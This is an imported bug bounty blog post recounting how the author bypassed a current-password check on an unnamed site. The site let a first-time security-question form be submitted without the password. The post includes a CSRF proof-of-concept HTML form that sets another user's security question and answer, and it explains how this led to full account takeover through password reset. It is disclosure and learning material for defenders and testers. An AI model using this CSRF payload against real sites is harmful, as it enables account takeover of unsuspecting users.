---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-03-11_how-i-was-able-to-bypass-the-current-password.md
original_filename: 2020-03-11_how-i-was-able-to-bypass-the-current-password.md
title: How I was able to bypass the current password?
category: documents
detected_topics:
- sqli
- command-injection
- password-reset
- otp
- csrf
tags:
- imported
- documents
- sqli
- command-injection
- password-reset
- otp
- csrf
language: en
raw_sha256: b4bfe24325508130f3452e75e7330e9eb618d2e9b98fc9dc031d0605d32871fe
text_sha256: fa285147e56a3fbd956b02ac7c92113d7bb99c9711eb41f5961eb9abebcf0b37
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# How I was able to bypass the current password?

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-03-11_how-i-was-able-to-bypass-the-current-password.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, password-reset, otp, csrf
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `b4bfe24325508130f3452e75e7330e9eb618d2e9b98fc9dc031d0605d32871fe`
- Text SHA256: `fa285147e56a3fbd956b02ac7c92113d7bb99c9711eb41f5961eb9abebcf0b37`


## Content

---
title: "How I was able to bypass the current password?"
page_title: "How I was able to bypass the current password? - Ninad Mathpati"
url: "https://ninadmathpati.com/how-i-was-able-to-bypass-the-current-password/"
final_url: "https://ninadmathpati.com/2020/03/11/how-i-was-able-to-bypass-the-current-password/"
authors: ["Ninad Mathpati (@ninad_mathpati)"]
bugs: ["Account takeover", "CSRF"]
publication_date: "2020-03-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4721
---

[Bug Bounty](https://ninadmathpati.com/category/bug-bounty/)

## How I was able to bypass the current password?

![](https://ninadmathpati.com/wp-content/uploads/2020/03/confirmpassword-300x273-1.png)

Hello Guys,

Hope you are earning a lot through bug bounty, Now, a day’s I feel bug bounty is all about bypassing the remediation implemented. Thought to share one of my recent findings, As it’s a private program, let’s call it as some Xyz.com 

Most of them might have gone through this scenario, while we update the password or update the security question and answer, there the server asks to confirm the user’s identity by asking him to re-enter his password to save or update the changes.

Here I was able to bypass the confirm password,

In this scenario what most of them would try,

  1. _Check whether the password is properly validated?_
  2. _Try removing the old password parameter through burp suite_
  3.  _Try providing different user’s password._
  4. _Response manipulation._
  5. _SQL injection._

In my case, any of the above were not working,

[![Not Working Help Me GIF by CBS All Access - Find & Share on GIPHY](https://media2.giphy.com/media/L2NKADCzPrLg2opnWs/giphy.gif)](https://giphy.com/gifs/CBSAllAccess-cbs-tell-me-a-story-tmas210-L2NKADCzPrLg2opnWs)

As, I knew that application had CSRF tokens, that were easily bypassed by removing the token. But as the confirm current Password was implemented the CSRF also could not help there.

Then, I created a new account and after logging in then I was asked to create a security question and answer, I captured CSRF for that request and the CSRF was something like this,

**_CSRF_**
  
  
  <html>
  <body>
  <script>history.pushState('', '', '/')</script>
  <form action="https://xyz.com/myprofile/editLogin" method="POST">
  <input type="hidden" name="question" value="PET" />
  <input type="hidden" name="answer" value="test1234" />
  <input type="hidden" name="answer2" value="test1234" />
  <input type="hidden" name="saveSubmit" value="Save&#32;and&#32;Continue" />
  <input type="hidden" name="origin" value="loginAccount" />
  <input type="hidden" name="requestor" value="accountSummary" />
  <input type="hidden" name="loginPage" value="false" />
  <input type="hidden" name="securityQAPage" value="true" />
  <input type="submit" value="Submit request" />
  </form>
  </body>
  </html>

The CSRF request was different for updating the security Q &A and for creating the security Q&A. So as for the 1st time the user is creating the security question and password, So here no need to provide the **_current_** **_password_** to make changes, Then why not use this CSRF to update the security question, When I tried to update the security question and answer of the other user, it worked, Thus I was successful in bypassing the current password option.

[![Russell Wilson Karate GIF by Alaska Airlines - Find & Share on GIPHY](https://media3.giphy.com/media/xT0xeHDVBcAulhRJRK/giphy.gif)](https://giphy.com/gifs/alaskaairlines-xT0xeHDVBcAulhRJRK)

I was able to change anyone’s, security question,

Through this vulnerability, I was able to do a full account takeover, As on the forgot password page there was an option to reset the password by answering the security question.

Thus it was full account takeover.

This was a short blog as my **server-side vulnerabilities** blog would take some time.

Hope you like it!

[__ March 11, 2020](https://ninadmathpati.com/2020/03/11/how-i-was-able-to-bypass-the-current-password/)[ __Ninad Mathpati](https://ninadmathpati.com/author/hacher2202/)

[ __](https://www.facebook.com/sharer/sharer.php?u=https://ninadmathpati.com/2020/03/11/how-i-was-able-to-bypass-the-current-password/ "Share on Facebook") [ __](https://twitter.com/share?url=https://ninadmathpati.com/2020/03/11/how-i-was-able-to-bypass-the-current-password/ "Share on Twitter") [ __](http://www.linkedin.com/shareArticle?mini=true&url=https://ninadmathpati.com/2020/03/11/how-i-was-able-to-bypass-the-current-password/ "Share on LinkedIn") [ __](http://www.digg.com/submit?url=https://ninadmathpati.com/2020/03/11/how-i-was-able-to-bypass-the-current-password/ "Share on Digg")
